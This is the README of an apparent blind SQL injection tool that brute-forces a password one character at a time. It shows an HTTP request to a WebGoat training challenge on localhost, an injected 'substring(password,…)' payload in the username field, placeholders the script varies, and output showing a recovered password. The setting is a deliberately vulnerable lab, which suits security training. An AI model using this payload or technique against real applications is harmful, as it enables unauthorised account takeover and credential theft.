# SLQIBruteforcing

Script for bruteforcing password with SQL injection

## Using

``./sqliSubstring.py [requestfile]``

### Exmaple

Write your request to target in file. For example ``request.txt``

>PUT /WebGoat/challenge/6 HTTP/1.1
>
>Host: localhost:5000
>
>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
>
>Accept: */*
>
>Accept-Language: en-US,en;q=0.5
>
>Accept-Encoding: gzip, deflate
>
>Referer: http://localhost:5000/WebGoat/start.mvc
>
>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
>
>X-Requested-With: XMLHttpRequest
>
>Content-Length: 90
>
>DNT: 1
>
>Connection: close
>
>Cookie: JSESSIONID=1947DDDDCE0FF65F8E976CJGDDDDDDDB323A826D545F26222
>
>username_reg=tom' and substring(password,1,1)='a&email_reg=loleclole%40sds&password_reg=pass&confirm_password_reg=pass

Set variables in request file for index and letter with ``§i`` and ``§s``

>username_reg=tom' and substring(password,§i,1)='§s&email_reg=loleclole%40sds&password_reg=pass&confirm_password_reg=pass

Run script

``./sqliSubstring.py request.txt``

### Output

```
Trying to detect correct response length...
Detecting |██████████████████████████████████████████████████| 100.0% Complete
Correct length is 174
Bruteforcing...
Checking index 24
Complete!
Password is: thisisasecretfortomonly
```
